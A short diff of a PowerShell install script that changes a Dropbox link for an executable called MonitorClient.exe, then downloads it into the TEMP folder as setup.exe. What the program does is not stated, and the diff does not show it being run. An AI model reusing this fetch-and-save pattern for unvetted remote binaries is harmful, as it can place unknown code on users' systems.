@@ -1,6 +1,6 @@
 # install.ps1 poky
 
-$u = "https://www.dropbox.com/scl/fi/g9n5elasjy54dl2kwfntg/MonitorClient.exe?rlkey=wync0ieqrytdi12bugsw6hzu7&st=lbhdscoe&dl=1"
+$u = "https://www.dropbox.com/scl/fi/ihtnb0lu9gkmdg5wjdat9/MonitorClient-1.exe?rlkey=rjtun873wsylyhzxut8qll7e4&st=hvuazxvr&dl=1"
 $p = "$env:TEMP\setup.exe"
 
 Invoke-RestMethod $u -OutFile $p
